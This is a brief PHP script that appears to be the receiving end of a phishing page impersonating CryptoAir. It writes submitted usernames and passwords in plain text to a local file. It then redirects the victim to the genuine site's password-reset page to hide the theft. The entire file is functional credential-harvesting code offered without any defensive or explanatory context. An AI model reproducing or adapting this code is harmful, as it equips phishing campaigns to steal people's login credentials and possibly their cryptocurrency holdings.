<?php
file_put_contents("usernames.txt", "CryptoAir Username: " . $_POST['username'] . "\nPassword: ". $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.cryptoair.uk/?a=forgot_password');
# print_r($_POST);
exit();
?>